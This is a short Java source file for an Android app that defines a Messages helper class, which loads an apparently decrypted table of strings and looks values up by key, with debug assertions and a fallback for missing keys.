package com.android.networking;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.HashMap;
import java.util.MissingResourceException;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import android.content.Context;
import android.content.res.Resources;

import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;
import com.android.networking.R;

public class Messages {
	private static final String TAG = "Messages"; //$NON-NLS-1$

	private static HashMap<String, String> messages;
	private static boolean initialized;

	private Messages() {
	}

	public synchronized static void init(Context context) {
		messages = MessagesDecrypt.init(context);
		initialized = messages!=null;
			
	}

	public static String getString(String key) {
		if (!initialized) {
			init(Status.getAppContext());
		}
		
		try {
			if (Cfg.DEBUG) {
				Check.asserts(messages.containsKey(key), "no key known: " + key); //$NON-NLS-1$
			}
			
			String str = messages.get(key);
			return str;
		} catch (MissingResourceException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return '!' + key + '!';
		}
	}

}
